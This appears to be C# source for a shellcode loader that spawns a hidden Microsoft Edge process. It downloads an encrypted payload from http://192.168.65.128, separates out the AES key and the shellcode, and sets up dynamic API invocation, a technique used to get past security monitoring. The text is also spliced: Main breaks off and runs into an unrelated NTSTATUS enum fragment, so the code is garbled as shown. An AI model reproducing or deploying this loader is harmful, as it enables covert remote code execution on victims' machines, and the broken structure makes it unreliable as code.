// Compile: csc /unsafe Program.cs
using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Diagnostics;
using static DynamicInvoke.STRUCTS;
using static DynamicInvoke.DELEGATES;

namespace DynamicInvoke
{
	public static class Program
	{
		// Define target process properties: MS Edge
		public static string processToSpawn = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
		public static string processArgs = "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5";
		public static string startDir = @"C:\\Program Files (x86)\\Microsoft\\Edge\\Application";

		public static void Main(string[] args)
		{
			byte[] encryptedData;

			using(var client = new WebClient())
			{
				client.Proxy = WebRequest.GetSystemWebProxy();
				client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

				// Set TLS versions
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
				encryptedData = client.DownloadData("http://192.168.65.128/encrypted.bin");
			}

			// Extract the key and the encrypted shellcode
			byte[] key = new byte[16];
			byte[] encryptedShellcode = new byte[encryptedData.Length - 16];
			Array.Copy(encryptedData, 0, key, 0, 16);

				FileCheckedOut = 0xc0000901,
				CheckOutRequired = 0xc0000902,
				BadFileType = 0xc0000903,
				FileTooLarge = 0xc0000904,
				FormsAuthRequired = 0xc0000905,
				VirusInfected = 0xc0000906,
				VirusDeleted = 0xc0000907,
				TransactionalConflict = 0xc0190001,
				InvalidTransaction = 0xc0190002,
				TransactionNotActive = 0xc0190003,
				TmInitializationFailed = 0xc0190004,
				RmNotActive = 0xc0190005,
				RmMetadataCorrupt = 0xc0190006,
				TransactionNotJoined = 0xc0190007,
				DirectoryNotRm = 0xc0190008,
				CouldNotResizeLog = 0xc0190009,
				TransactionsUnsupportedRemote = 0xc019000a,
				LogResizeInvalidSize = 0xc019000b,
				RemoteFileVersionMismatch = 0xc019000c,
				CrmProtocolAlreadyExists = 0xc019000f,
				TransactionPropagationFailed = 0xc0190010,
				CrmProtocolNotFound = 0xc0190011,
				TransactionSuperiorExists = 0xc0190012,
				TransactionRequestNotValid = 0xc0190013,
				TransactionNotRequested = 0xc0190014,
				TransactionAlreadyAborted = 0xc0190015,
				TransactionAlreadyCommitted = 0xc0190016,
				TransactionInvalidMarshallBuffer = 0xc0190017,
				CurrentTransactionNotValid = 0xc0190018,
				LogGrowthFailed = 0xc0190019,
				ObjectNoLongerExists = 0xc0190021,
				StreamMiniversionNotFound = 0xc0190022,
				StreamMiniversionNotValid = 0xc0190023,
				MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
				CantOpenMiniversionWithModifyIntent = 0xc0190025,
				CantCreateMoreStreamMiniversions = 0xc0190026,
				HandleNoLongerValid = 0xc0190028,
				NoTxfMetadata = 0xc0190029,
				LogCorruptionDetected = 0xc0190030,
				CantRecoverWithHandleOpen = 0xc0190031,
				RmDisconnected = 0xc0190032,
				EnlistmentNotSuperior = 0xc0190033,
				RecoveryNotNeeded = 0xc0190034,
				RmAlreadyStarted = 0xc0190035,
				FileIdentityNotPersistent = 0xc0190036,
				CantBreakTransactionalDependency = 0xc0190037,
				CantCrossRmBoundary = 0xc0190038,
				TxfDirNotEmpty = 0xc0190039,
				IndoubtTransactionsExist = 0xc019003a,
				TmVolatile = 0xc019003b,
				RollbackTimerExpired = 0xc019003c,
				TxfAttributeCorrupt = 0xc019003d,
				EfsNotAllowedInTransaction = 0xc019003e,
				TransactionalOpenNotAllowed = 0xc019003f,
				TransactedMappingUnsupportedRemote = 0xc0190040,
				TxfMetadataAlreadyPresent = 0xc0190041,
				TransactionScopeCallbacksNotSet = 0xc0190042,
				TransactionRequiredPromotion = 0xc0190043,
				CannotExecuteFileInTransaction = 0xc0190044,
				TransactionsNotFrozen = 0xc0190045,
				MaximumNtStatus = 0xffffffff
		}
		public struct LIST_ENTRY
		{
			public IntPtr Flink;
			public IntPtr Blink;
		}
		[StructLayout(LayoutKind.Sequential)]
		public struct LDR_DATA_TABLE_ENTRY
		{
			public LIST_ENTRY InLoadOrderLinks;
			public LIST_ENTRY InMemoryOrderLinks;
			public LIST_ENTRY InInitializationOrderLinks;
			public IntPtr DllBase;
			public IntPtr EntryPoint;
			public UInt32 SizeOfImage;
			public UNICODE_STRING FullDllName;
			public UNICODE_STRING BaseDllName;
		}
		[StructLayout(LayoutKind.Explicit)]
		public struct ApiSetNamespace
		{
			[FieldOffset(0x0C)]
			public int Count;
			[FieldOffset(0x10)]
			public int EntryOffset;
		}
		[StructLayout(LayoutKind.Explicit, Size = 24)]
		public struct ApiSetNamespaceEntry
		{
			[FieldOffset(0x04)]
			public int NameOffset;
			[FieldOffset(0x08)]
			public int NameLength;
			[FieldOffset(0x10)]
			public int ValueOffset;
			[FieldOffset(0x14)]
			public int ValueLength;
		}

		[StructLayout(LayoutKind.Explicit)]
		public struct ApiSetValueEntry
		{
			[FieldOffset(0x00)]
			public int Flags;
			[FieldOffset(0x04)]
			public int NameOffset;
			[FieldOffset(0x08)]
			public int NameCount;
			[FieldOffset(0x0C)]
			public int ValueOffset;
			[FieldOffset(0x10)]
			public int ValueCount;
		}
		public enum PROCESSINFOCLASS: int
		{
			ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
				ProcessWow64Information, // q: ULONG_PTR
		};
	}
	public class Invoke
	{
		public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
		{
			IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
			return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
		}
		
		public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
		{
			Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
			return funcDelegate.DynamicInvoke(Parameters);
		}
		
		public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
		{
